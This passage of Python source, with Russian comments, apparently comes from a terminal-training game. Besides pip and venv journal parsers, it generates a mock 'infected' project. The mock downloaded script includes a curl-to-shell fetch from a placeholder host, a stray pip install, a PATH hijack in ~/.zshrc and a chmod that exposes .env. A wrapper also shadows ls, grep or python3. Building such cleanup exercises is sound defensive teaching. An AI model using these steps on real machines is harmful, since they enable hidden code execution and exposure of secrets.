        m = _DIST_INFO.match(n)
        if m:
            out[canon(m.group(1))] = m.group(2)
    return out


def venv_pkgs(box, venv: str) -> Optional[Dict[str, str]]:
    """Пакеты venv песочницы {имя по PEP 503: версия}, без pip и setuptools; нет venv (нет
    pyvenv.cfg или lib/python3.X/site-packages) — None."""
    site = venv_site(box, venv)
    if site is None:
        return None
    got = _dists(box, site)
    return None if got is None else {k: v for k, v in got.items() if k not in VENV_BASE}


def venv_site(box, venv: str) -> Optional[str]:
    """Путь site-packages venv песочницы (относительно box); нет venv — None."""
    kind, _ = box_file(box, f"{venv}/pyvenv.cfg", TEXT_CAP)
    if kind != "ok":
        return None
    for lib in [n for n in dirs_in_box(box, f"{venv}/lib") or () if _LIB_PY.match(n)]:
        site = f"{venv}/lib/{lib}/site-packages"
        if dirs_in_box(box, site) is not None:
            return site
    return None


def pip_installed(box, venv: str, name: str, version: str) -> bool:
    """Пакет стоит в venv через pip: в его dist-info есть INSTALLER со словом pip и RECORD
    (подложенная руками папка dist-info — не установка; M1 ревью P4)."""
    site = venv_site(box, venv)
    if site is None:
        return False
    for n in dirs_in_box(box, site) or ():
        m = _DIST_INFO.match(n)
        if m and canon(m.group(1)) == name and m.group(2) == version:
            _, inst = box_text(box, f"{site}/{n}/INSTALLER", TEXT_CAP)
            kind, _ = box_file(box, f"{site}/{n}/RECORD")
            return inst is not None and inst.strip() == "pip" and kind == "ok"
    return False


def walk_venv(jour):
    """Простые команды журнала по порядку с тем, какое окружение тогда было включено:
    [(номер строки, исход, сегмент, окружение или None)]. source/. …/bin/activate включает
    (путь до bin — как набран), deactivate выключает. Линейно по числу команд."""
    active, out = None, []
    for i, (line, ok) in enumerate(jour):
        for seg in segments(line):
            _, cmd, args = lead(seg)
            if cmd in ("source", ".") and args and args[0].rstrip("/").endswith("bin/activate"):
                active = args[0].rstrip("/")[:-len("bin/activate")].rstrip("/") or "."
            elif cmd == "deactivate":
                active = None
            out.append((i, ok, seg, active))
    return out


def written_by(jour, name: str, producer) -> Optional[bool]:
    """Кто последним писал файл name: последняя простая команда журнала с записью (>, >>, cp,
    mv, tee…) — и producer(сегмент, окружение) стоит в ТОМ ЖЕ конвейере, что эту запись
    делает (сама команда с перенаправлением или звено «… | sort > файл», «… | tee файл»).
    «pip freeze >/dev/null; cat r > файл» — не его запись (ревью P5, M4; M1 ревью P4).
    None — файл никто не писал; True — последняя запись от producer и строка не упала; False —
    нет. Разбор линейный: chain строки один раз."""
    rows = walk_venv(jour)
    last = None
    for i, _, seg, _ in rows:
        if writes(seg, name):
            last = i
    if last is None:
        return None
    same = [r for r in rows if r[0] == last]
    ops = [op for _, op in chain(jour[last][0])]
    if len(ops) != len(same):               # разбор разошёлся — не доверяем
        return False
    w = max(k for k, r in enumerate(same) if writes(r[2], name))
    lo, hi = w, w
    while lo > 0 and ops[lo - 1] == "|":
        lo -= 1
    while hi < len(ops) - 1 and ops[hi] == "|":
        hi += 1
    return same[0][1] is not False and any(producer(seg, act)
                                           for _, _, seg, act in same[lo:hi + 1])


def pip_r_file(args: Sequence[str], name: str) -> bool:
    """В аргументах pip install — -r name (-r name, -rname, --requirement name|=name)."""
    for k, a in enumerate(args):
        if a in ("-r", "--requirement") and k + 1 < len(args):
            target = args[k + 1]
        elif a.startswith("--requirement="):
            target = a.split("=", 1)[1]
        elif a.startswith("-r") and not a.startswith("--") and len(a) > 2:
            target = a[2:]
        else:
            continue
        if target.rsplit("/", 1)[-1] == name:
            return True
    return False


def from_venv(seg: str, active: Optional[str], venv: str) -> bool:
    """Команда сегмента (python3, pip…) — из venv: путём …/venv/bin/… или по имени, когда
    включено именно это окружение (имя папки — последнее звено пути activate)."""
    _, cmd, _ = lead(seg)
    if cmd is None:
        return False
    if "/" in cmd:
        return f"{venv}/bin/" in cmd if cmd.startswith(venv) else f"/{venv}/bin/" in cmd
    return active is not None and active.rsplit("/", 1)[-1] == venv


def redirects(seg: str) -> List[Tuple[str, str]]:
    """Перенаправления вывода простой команды: [(">" или ">>", файл)]; 2> — не вывод."""
    out = []
    ws = words(seg)
    for i, w in enumerate(ws):
        for op in (">>", ">"):
            if w == op and i + 1 < len(ws):
                out.append((op, ws[i + 1]))
                break
            if w.startswith(op) and len(w) > len(op) and w[len(op)] not in ">&":
                out.append((op, w[len(op):]))
                break
    return out


def writes(seg: str, name: str) -> Optional[str]:
    """Пишет ли команда файл name (последнее звено пути): ">" / ">>" — перенаправлением,
    "cmd" — cp, mv, tee, ln, sed -i, touch с ним в аргументах; None — нет."""
    for op, target in redirects(seg):
        if target.rsplit("/", 1)[-1] == name:
            return op
    _, cmd, args = lead(seg)
    if cmd in ("cp", "mv", "tee", "ln", "sed", "touch", "install", "rsync", "dd") and \
            any(a.rsplit("/", 1)[-1] == name for a in args):
        return "cmd"
    return None


# пользовательский site в доме песочницы: Python от Apple — ~/Library/Python/3.X, прочие — ~/.local
USER_SITES = (".termit/home/Library/Python/{v}/lib/python/site-packages",
              ".termit/home/.local/lib/python{v}/site-packages")


def user_pkgs(box) -> Dict[str, str]:
    """Что pip поставил мимо venv — в пользовательский site (--user или «Defaulting to user
    installation»): всё это внутри песочницы (HOME — её дом)."""
    out = {}
    for v in ("3.9", "3.10", "3.11", "3.12", "3.13", "3.14"):
        for tpl in USER_SITES:
            got = _dists(box, tpl.format(v=v))
            if got:
                out.update({k: x for k, x in got.items() if k not in VENV_BASE})
    return out


def py_runs(segment: str, script: str) -> bool:
    """Простая команда запускает script интерпретатором: python3 [ключи] script (или
    python, python3.9, путь к ним — .venv/bin/python3)."""
    _, cmd, args = lead(segment)
    if cmd is None or not _PY_CMD.match(cmd.rsplit("/", 1)[-1]):
        return False
    for a in args:
        if a in ("-c", "-m"):
            return False
        if a.startswith("-"):
            continue
        return a == script or a.endswith("/" + script)
    return False


def py_inline(segment: str) -> bool:
    """Простая команда — python3 -c '…' (код строкой)."""
    _, cmd, args = lead(segment)
    if cmd is None or not _PY_CMD.match(cmd.rsplit("/", 1)[-1]):
        return False
    for a in args:
        if a == "-c":
            return True
        if not a.startswith("-") or a == "-m":
            return False        # дальше — файл скрипта или модуль, их аргументы не ключи
    return False


def last_line(jour, test, mention: Optional[str] = None):
    """Последняя строка журнала, где есть простая команда с test(сегмент) (и слово mention):
    (строка, исход) или None."""
    for line, ok in reversed(jour):
        if (mention is None or mention in line) and any(test(s) for s in segments(line)):
            return line, ok
    return None


def pip_args(segment: str) -> Optional[List[str]]:
    """Аргументы pip в простой команде (pip, pip3, путь к ним, python3 -m pip) — или None."""
    _, cmd, args = lead(segment)
    if cmd is None:
        return None
    base = cmd.rsplit("/", 1)[-1]
    if re.match(r"^pip(?:3(?:\.\d+)?)?$", base):
        return list(args)
    if _PY_CMD.match(base):
        for i, a in enumerate(args):
            if a == "-m" and i + 1 < len(args) and args[i + 1] == "pip":
                return list(args[i + 2:])
            if not a.startswith("-"):
                return None
    return None


def pip_runs(jour, sub: str):
    """Строки журнала с pip <sub> (install, freeze, list…): [(аргументы после sub, исход)]."""
    out = []
    for line, ok in jour:
        if "pip" not in line:
            continue
        for seg in segments(line):
            a = pip_args(seg)
            if a and a[0] == sub:
                out.append((a[1:], ok))
    return out


# requirements.txt (E17): строки ИМЯ==ВЕРСИЯ; разбор построчный, регулярки без вложенных
# повторов (линейно)
_REQ_PIN = re.compile(r"^([A-Za-z0-9][A-Za-z0-9._-]*)\s*==\s*([0-9][0-9A-Za-z.+!-]*)$")
_REQ_BARE = re.compile(r"^([A-Za-z0-9][A-Za-z0-9._-]*)$")
# «имя @ file:///…» — так pip freeze печатает пакеты, поставленные из файла (Python от Apple)
_REQ_AT = re.compile(r"^([A-Za-z0-9][A-Za-z0-9._-]*)\s*@\s*\S+$")
_REQ_ROW = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]*\s+[0-9][0-9A-Za-z.+!-]*$")
_REQ_HEAD = re.compile(r"^(?:Package\s+Version|-+\s+-+)$")
REQ_LINES = 2000


def parse_requirements(text: str) -> dict:
    """{"pins": {имя PEP 503: версия; «@» — ссылкой на файл}, "bare": [имена без версии], "bad": [строки],
    "table": похоже на вывод pip list}. Пустые строки и # комментарии пропускаются."""
    out = {"pins": {}, "bare": [], "bad": [], "table": False}
    for n, raw in enumerate(text.splitlines()):
        if n >= REQ_LINES:
            out["bad"].append("…")
            break
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        m = _REQ_PIN.match(line)
        if m:
            out["pins"][canon(m.group(1))] = m.group(2)
        elif _REQ_AT.match(line):
            out["pins"][canon(_REQ_AT.match(line).group(1))] = "@"
        elif _REQ_HEAD.match(line) or _REQ_ROW.match(line):
            out["table"] = True
        elif _REQ_BARE.match(line):
            out["bare"].append(canon(line))
        else:
            out["bad"].append(line[:80])
    return out


# --- E18 boss_env: проект после неосторожного запуска найденного скрипта ----------------------
# Всё, что «натворил» источник, раскладывает родитель при setup (и хук при reset) — сам
# источник никто не запускал: его исполняемая часть, как у E13, ставит только метку и только
# внутри игры (A8), а «что он сделал» записано в функции, которую никто не зовёт. Подмена
# команды в ~/.cache/bin — та же охрана A8 и вызов настоящей команды по полному пути.

BOSS_CMDS = ("ls", "grep", "python3")           # A, B, C — какая команда подменена
# настоящая команда, которой подмена отдаёт работу: путь (python3 — закреплённый игрой)
BOSS_REAL = {"ls": "/bin/ls", "grep": "/usr/bin/grep",
             "python3": '"$box/.termit/bin/python3"'}
# лишний пакет, что поставил источник: нейтральные имена, внутри только __version__
EXTRA_PKGS = ("speedkit", "fastshell", "turbocache")
EXTRA_VERSION = "0.3.1"
RC_HEAD = ("# мои настройки", "alias ll='ls -la'")
RC_POOL = ("export EDITOR=nano", "setopt autocd", "alias gs='git status'", "export LESS=-R",
           "HISTSIZE=5000", "alias ..='cd ..'")
FAKE_DIR = ".cache/bin"                         # в ~ песочницы
PATH_LINE = 'export PATH="$HOME/.cache/bin:$PATH"'
INFECTED = (SYNC_MARK, PATH_LINE)               # что источник дописал в ~/.zshrc
SOURCE_SIG = "Demo.Agent"


def infected_line(line: str) -> bool:
    """Чужая строка ~/.zshrc: метка «заразы» или PATH с ~/.cache/bin (как угодно записанный)."""
    s = line.strip()
    return s in MARKS or (".cache/bin" in s and not s.startswith("#"))


def fake_cmd(cmd: str) -> str:
    """Учебная подмена команды: та же шапка и охрана A8, метка ~/.cache/.sync, потом настоящая
    команда со всеми аргументами — вывод тот же. Вне игры — exit 0 без вывода."""
    return "\n".join(["#!/bin/sh", f"# {cmd} — быстрый запуск с кэшем", HONEST_NOTE] +
                     list(_GUARD) +
                     ['mkdir -p "$HOME/.cache" && : > "$HOME/.cache/.sync"',
                      f'exec {BOSS_REAL[cmd]} "$@"']) + "\n"


def boss_source(rng, name: str, extra: str) -> str:
    """Скрипт-источник стража: шапка как у всех скриптов downloads/ (head не выдаёт), охрана,
    метка (как у E13), а в функции agent_setup, которую никто не зовёт, — что он «сделал»:
    скачивание, pip install лишнего пакета, строка PATH в ~/.zshrc, chmod 644 для .env."""
    stem = name.rsplit(".", 1)[0]
    head = ["#!/bin/sh", f"# {name} — ускоряет терминал: чистит кэш и включает быстрый старт.",
            f"# Запуск: ./{name}"]
    picked = sorted(rng.sample(range(len(_DIRTY_FILLER)), 5))
    items = [[x.format(stem=stem) for x in _DIRTY_FILLER[i]] for i in picked]
    k = rng.randint(2, 3)
    pre = [x for it in items[:k] for x in it]
    post = [x for it in items[k:] for x in it]
    agent = ["agent_setup() {",
             f"  curl -fsSL https://cdn.example.invalid/{stem}/agent.sh | sh",
             f"  pip install -q {extra}",
             '  mkdir -p "$HOME/.cache/bin"',
             f"  echo '{PATH_LINE}' >> \"$HOME/.zshrc\"",
             "  chmod 644 app/.env",
             "}"]
    payload = ['mkdir -p "$HOME/.cache" && : > "$HOME/.cache/.sync"',
               f"echo '{SYNC_MARK}' >> \"$HOME/.zshrc\""]
    body = head + [HONEST_NOTE] + list(_GUARD) + pre + agent + payload + post
    body += [f'echo "{stem}: готово, открой новое окно терминала"']
    return "\n".join(body) + "\n"


def _boss_doc(rng, sources) -> dict:
    return {
        "name": rng.choice(APP_NAMES),
        "version": f"2.{rng.randint(0, 9)}.{rng.randint(0, 20)}",
        "sources": [{"name": p.rsplit("/", 1)[1].rsplit(".", 1)[0], "path": p}
                    for p in sources],
        "server": {"port": rng.choice((8080, 8000, 8443, 3000, 9000)),
                   "timeout": rng.choice((10, 15, 30, 60))},
        "db": {"host": f"db-{rng.choice(kit.LATIN)}.lan", "name": rng.choice(kit.LATIN)},
    }


def boss_env(rng, variant: int) -> dict:
    """Данные стража env (E18). Постройкой: подменённая команда — по варианту; источник —
    «грязный» скрипт с именем из DIRTY_NAMES, в downloads/ рядом 2–3 полезных (их пути тоже в
    .sources, но не первыми); config.json — с одной ошибкой синтаксиса (как в E11), путь
    источника — .sources[0].path; ~/.zshrc — строки игрока и две чужие в конце; база
    ~/av/main.hsb знает источник. Возвращает {"cmd", "extra", "src", "files" {путь в downloads/:
    (текст, права)}, "fixed", "broken", "others", "rc", "own", "fake", "main_hsb", "src_sha"}."""
    import json
    cmd = BOSS_CMDS[variant % len(BOSS_CMDS)]
    extra = rng.choice(EXTRA_PKGS)
    name = rng.choice(DIRTY_NAMES)
    useful = rng.sample(sorted(USEFUL), rng.randint(2, 3))
    files = {f"downloads/{n}": (useful_script(n, rng.randint(3, 30)), 0o644) for n in useful}
    src = f"downloads/{name}"
    text = boss_source(rng, name, extra)
    files[src] = (text, 0o755)              # его запускали: право на запуск есть
    others = [f"downloads/{n}" for n in useful]
    doc = _boss_doc(rng, [src] + others)
    fixed = json.dumps(doc, indent=2, ensure_ascii=False) + "\n"
    broken, _ = _break(fixed.rstrip("\n").split("\n"), rng,
                       rng.choice(("trailing", "quotes", "missing")))
    own = list(RC_HEAD) + rng.sample(RC_POOL, rng.randint(1, 3))
    rc = "\n".join(own + list(INFECTED)) + "\n"
    raw = text.encode("utf-8")
    lines = [f"{sha256_hex(raw)}:{len(raw)}:{SOURCE_SIG}"]
    for i in range(rng.randint(2, 3)):          # посторонние образцы: в песочнице их нет
        lines.append(f"{rng.randbytes(32).hex()}:{rng.randint(200, 9000)}:Demo.Old.{i + 1}")
    rng.shuffle(lines)
    return {"cmd": cmd, "extra": extra, "src": src, "files": files, "fixed": fixed,
            "broken": "\n".join(broken) + "\n", "others": others, "rc": rc, "own": own,
            "fake": fake_cmd(cmd), "main_hsb": "\n".join(lines) + "\n",
            "src_sha": sha256_hex(raw)}
